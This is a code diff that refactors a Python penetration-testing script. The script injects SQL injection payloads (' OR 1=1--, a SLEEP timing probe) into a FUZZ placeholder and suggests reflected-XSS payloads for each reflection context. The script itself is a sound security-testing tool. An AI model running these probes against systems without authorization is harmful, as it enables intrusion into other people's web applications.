@@ -12,14 +12,11 @@ def parse_request_file(filepath):
     with open(filepath, 'r') as f:
         content = f.read()
     
-    # Split headers and body
     header_section, _, body = content.partition('\n\n')
     request_lines = header_section.splitlines()
     
-    # Parse request line (e.g., "POST /login.php HTTP/1.1")
     method, path, _ = request_lines[0].split()
     
-    # Parse headers
     headers = {}
     host = ''
     for line in request_lines[1:]:
@@ -31,7 +28,7 @@ def parse_request_file(filepath):
     if not host:
         raise ValueError("Host header is missing in the request file.")
         
-    url = f"http://{host}{path}" # Assumes http, requests will handle https if needed
+    url = f"http://{host}{path}"
     
     return {"method": method, "url": url, "headers": headers, "body": body}
 
@@ -48,21 +45,20 @@ def send_fuzzed_request(session, req_details, payload):
         fuzzed_url = url
         fuzzed_body = body.replace("FUZZ", payload)
     else:
-        # If FUZZ is not found, we can't test.
         return None
 
     return session.request(
         method=req_details['method'],
         url=fuzzed_url,
-        data=fuzzed_body.encode('utf-8'), # Encode body for requests library
+        data=fuzzed_body.encode('utf-8'),
         headers=req_details['headers']
     )
 
-# --- Testing Modules (Modified to use the new request sender) ---
+# --- Testing Modules ---
 
 def test_sql_injection(session, req_details, baseline):
     """Performs low-volume SQLi checks."""
-    print("\n--- 💉 Starting SQL Injection Tests ---")
+    print("\n--- Starting SQL Injection Tests ---")
     
     payload_true = "' OR 1=1--"
     payload_false = "' OR 1=2--"
@@ -72,12 +68,12 @@ def test_sql_injection(session, req_details, baseline):
         res_false = send_fuzzed_request(session, req_details, payload_false)
 
         if len(res_true.content) == baseline["content_length"] and len(res_false.content) != baseline["content_length"]:
-            print("✅ Potential Boolean-Based SQLi Found!")
-            print(f"   Payload used: {payload_true}")
+            print("[+] Potential Boolean-Based SQLi Found!")
+            print(f"    Payload used: {payload_true}")
         else:
-            print("⚪️ No Boolean-Based SQLi detected.")
+            print("[-] No Boolean-Based SQLi detected.")
     except Exception as e:
-        print(f"⚠️  Error during Boolean-Based SQLi test: {e}")
+        print(f"[!] Error during Boolean-Based SQLi test: {e}")
 
     sleep_time = 7
     payload_time = f"' AND SLEEP({sleep_time})--"
@@ -86,23 +82,23 @@ def test_sql_injection(session, req_details, baseline):
         send_fuzzed_request(session, req_details, payload_time)
         end_time = time.time()
         if (end_time - start_time) >= sleep_time:
-            print("✅ Potential Time-Based SQLi Found!")
-            print(f"   Payload used: {payload_time}")
+            print("[+] Potential Time-Based SQLi Found!")
+            print(f"    Payload used: {payload_time}")
         else:
-            print("⚪️ No Time-Based SQLi detected.")
+            print("[-] No Time-Based SQLi detected.")
     except Exception as e:
-        print(f"⚠️  Error during Time-Based SQLi test: {e}")
+        print(f"[!] Error during Time-Based SQLi test: {e}")
 
 
 def test_cross_site_scripting(session, req_details):
     """Performs context-aware XSS check."""
-    print("\n--- ⚡️ Starting Cross-Site Scripting (XSS) Test ---")
+    print("\n--- Starting Cross-Site Scripting (XSS) Test ---")
     
     marker = "DSF7G8H9J0K"
     try:
         response = send_fuzzed_request(session, req_details, marker)
         if not response:
-            print("Could not find FUZZ keyword.")
+            print("[!] Could not find FUZZ keyword.")
             return
 
         soup = BeautifulSoup(response.content, 'html.parser')
@@ -112,19 +108,19 @@ def test_cross_site_scripting(session, req_details):
             parent = element.find_parent()
             
             if parent and parent.name == 'script':
-                print("ℹ️ Input is reflected inside a <script> block.")
-                print("   Suggested Payload: ';alert('XSS');//")
+                print("[*] Input is reflected inside a <script> block.")
+                print("    Suggested Payload: ';alert('XSS');//")
             elif parent and parent.attrs:
-                print("ℹ️ Input is reflected inside an HTML tag attribute.")
-                print("   Suggested Payload: '\" onmouseover=alert('XSS') '")
+                print("[*] Input is reflected inside an HTML tag attribute.")
+                print("    Suggested Payload: '\" onmouseover=alert('XSS') '")
             else:
-                print("ℹ️ Input is reflected as HTML text content.")
-                print("   Suggested Payload: <script>alert('XSS')</script>")
+                print("[*] Input is reflected as HTML text content.")
+                print("    Suggested Payload: <script>alert('XSS')</script>")
         else:
-            print("⚪️ Marker not found reflected in the response.")
+            print("[-] Marker not found reflected in the response.")
             
     except Exception as e:
-        print(f"⚠️ Error during XSS test: {e}")
+        print(f"[!] Error during XSS test: {e}")
 
 # --- Main Execution ---
 
@@ -137,19 +133,18 @@ def main():
     args = parser.parse_args()
     
     session = requests.Session()
-    session.headers.update({"User-Agent": "PrecisionPentestScript/2.0"})
+    session.headers.update({"User-Agent": "PrecisionPentestScript/3.0"})
     
     req_details = {}
     if args.request_file:
         try:
-            print(f"📄 Parsing request file: {args.request_file}")
+            print(f"[*] Parsing request file: {args.request_file}")
             req_details = parse_request_file(args.request_file)
-            # Update the session headers with headers from the file
             session.headers.update(req_details['headers'])
         except Exception as e:
-            print(f"❌ Error parsing request file: {e}")
+            print(f"[!] Error parsing request file: {e}")
             sys.exit(1)
-    else: # URL-based mode
+    else:
         parsed_url = urlparse(args.url)
         req_details = {
             "method": "GET",
@@ -157,30 +152,29 @@ def main():
             "headers": {"Host": parsed_url.netloc}
         }
 
-    print(f"🎯 Target Method: {req_details['method']}")
-    print(f"   Target URL: {req_details['url']}")
+    print(f"[*] Target Method: {req_details['method']}")
+    print(f"[*] Target URL: {req_details['url'].split('?')[0]}")
 
-    # Establish baseline
     try:
         baseline_resp = send_fuzzed_request(session, req_details, "1")
         if not baseline_resp:
-             print("❌ Could not send baseline request. Is 'FUZZ' keyword in the right place?")
+             print("[!] Could not send baseline request. Is 'FUZZ' keyword in the right place?")
              sys.exit(1)
         baseline = {
             "content_length": len(baseline_resp.content),
             "response_time": baseline_resp.elapsed.total_seconds()
         }
     except Exception as e:
-        print(f"❌ Error getting baseline: {e}")
+        print(f"[!] Error getting baseline: {e}")
         sys.exit(1)
 
     if baseline:
-        print(f"📊 Baseline established: Length={baseline['content_length']}, Time={baseline['response_time']:.2f}s")
+        print(f"[*] Baseline established: Length={baseline['content_length']}, Time={baseline['response_time']:.2f}s")
         test_sql_injection(session, req_details, baseline)
         test_cross_site_scripting(session, req_details)
     
-    print("\n--- 🔍 Scan Complete ---")
-    print("⚠️  Disclaimer: Only use this script on systems you are explicitly authorized to test.")
+    print("\n--- Scan Complete ---")
+    print("[!] Disclaimer: Only use this script on systems you are explicitly authorized to test.")
 
 
 if __name__ == "__main__":
